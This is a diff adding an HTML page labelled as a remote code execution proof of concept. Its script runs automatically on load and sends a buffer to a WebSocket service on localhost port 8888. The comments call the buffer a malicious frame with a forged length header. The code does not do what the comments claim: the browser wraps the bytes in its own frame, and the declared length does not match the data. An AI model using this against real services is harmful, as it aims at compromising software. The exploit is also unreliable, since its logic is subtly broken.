@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>RCE PoC</title>
+</head>
+<body>
+<script>
+  function triggerVulnerability() {
+    let ws = new WebSocket("ws://127.0.0.1:8888");
+    ws.onopen = function() {
+      // Create a malicious WebSocket frame.
+      // The first byte is 0x81 (FIN + TEXT frame).
+      // The second byte is 0xfe (masked + 126).
+      // The next two bytes are the payload length (0x7fff).
+      // The next four bytes are the masking key.
+      // The rest of the data is the payload.
+      let buf = new ArrayBuffer(10);
+      let view = new DataView(buf);
+      view.setUint8(0, 0x81);
+      view.setUint8(1, 0xfe);
+      view.setUint16(2, 0x7fff, false);
+      view.setUint32(4, 0x12345678, false);
+      view.setUint16(8, 0x4141, false);
+      ws.send(buf);
+    };
+  }
+
+  // We run this in a timeout to make sure the page has loaded.
+  setTimeout(triggerVulnerability, 100);
+</script>
+</body>
+</html>
